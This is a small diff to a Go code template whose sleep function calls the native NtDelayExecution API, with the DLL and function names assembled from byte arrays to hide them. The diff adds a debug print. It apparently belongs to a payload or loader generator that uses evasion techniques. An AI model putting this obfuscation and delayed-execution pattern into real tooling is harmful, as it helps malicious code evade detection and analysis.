@@ -5,7 +5,9 @@ func ntSleep() {
 	{{end}}
     ntdll := windows.NewLazySystemDLL(string([]byte{'n','t','d','l','l','.','d','l','l'}))
     NtDelayExecution := ntdll.NewProc(string([]byte{'N','t','D','e','l','a','y','E','x','e','c','u','t','i','o','n'}))
-
+	{{if .Debug}}
+	printDebug("info","Sleep for {{ .Delay }} seconds")
+	{{end}}
     time := -({{.Delay}} * 1000 * 10000)
 
     _, _, err := NtDelayExecution.Call(uintptr(0), uintptr(unsafe.Pointer(&time)))
